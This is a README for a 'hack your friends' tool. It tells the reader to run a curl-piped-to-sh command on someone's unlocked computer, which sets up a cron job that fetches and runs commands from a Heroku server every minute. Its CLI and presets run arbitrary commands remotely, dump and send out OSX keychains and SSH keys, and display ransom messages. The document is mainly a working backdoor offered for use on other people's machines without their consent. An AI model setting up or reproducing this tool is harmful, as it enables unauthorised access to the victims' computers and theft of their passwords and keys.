# Hack

This project helps your hack your friends. All you need to do is wait for them to leave their computer unlocked, open up Terminal, and run a single curl command.

[Check out this blog post for more details about how this works](TODO) or jump right in below.

## Getting Started

Clone, install, and link so you can use the `hack` cli tool.

```sh
git clone https://github.com/ccorcos/hack.git
git remote remove origin
cd hack
npm install
npm link
```

If you've never used Heroku before, [signup here](https://signup.heroku.com/) (it's free!) and set up their cli tool on your machine.

```sh
brew install heroku-toolbelt
heroku login
```

Create a Heroku app with an easy name to remember.

```sh
heroku create hacker-chet
```

The following command will get the root url for your Heroku website and put it in your `package.json`. This way the server can inject a root url into the shell scripts.

```sh
npm run init
```

You can stand up the server locally if you want do you can hack yourself and test things out.

```sh
npm start
```

Or you can deploy to Heroku.

```sh
npm run deploy
```

Now you're ready to hack!

## Infecting

To hack someone, run this in their Terminal:

```sh
curl <ROOT_URL>/hack | sh
```

`ROOT_URL` is the specific path to your application. When you're testing locally, this will be `localhost:5000` and when you deploy to Heroku, it will be something like `<APP_NAME>.herokuapp.com`.

What this does is sets up a cron job to ping the `/env/live` endpoint every minute and pipes the result to `sh`. And Heroku gives you HTTPS for free so I wouldn't be too worried about hacking yourself with it. Everything else happens at the commandline using the `hack` cli tool.

## API

- `hack deploy` - deploy your latest changes to Heroku.
- `hack logs` - view your server logs

The following commands are specific to environments and must be followed with a deploy for the changes to be applied to your server.

- `hack <env> exec <cmd>` - execute a command on the remote machine. e.g. `hack live exec "say hello"`
- `hack <env> cron <job>` - add a cronjob to the remote machine [[ref](http://www.nncron.ru/help/EN/working/cron-format.htm)]. e.g. `hack live cron "0 8 * * * say 'good morning'"`
- `hack <env> dump <cmd>` - execute a command on the remote machine and log the result.
- `hack <env> preset <name>` - check the source to see what presets there are and what they do.
- `hack <env> interval <time>` - change the ping interval. options are `1m`, `1d`, `1m`, `1y`
- `hack <env> reset` - reset all cronjobs and ping every minute
- `hack <env> rename <name>` - switch the env that gets pinged
- `hack <env> forget` - removed the ping cronjob to disconnect with the remote machine

## Presets
- `hack <env> preset 420` - say at 4:20PM every day 'its foe 20, ye better be toke-in'
- `hack <env> preset cronjobs` -  dump and send current cron jobs
- `hack <env> preset desktop <image_url>` - set desktop background to image
- `hack <env> preset passwords` - dump and send OSX keychains
- `hack <env> preset ransom <message>` - Opens TextEdit with ransom message
- `hack <env> preset ssh` - dump and send SSH keys

## PS

[A nice resource on how to make a Node.js CLI app.](http://blog.npmjs.org/post/118810260230/building-a-simple-command-line-tool-with-npm)
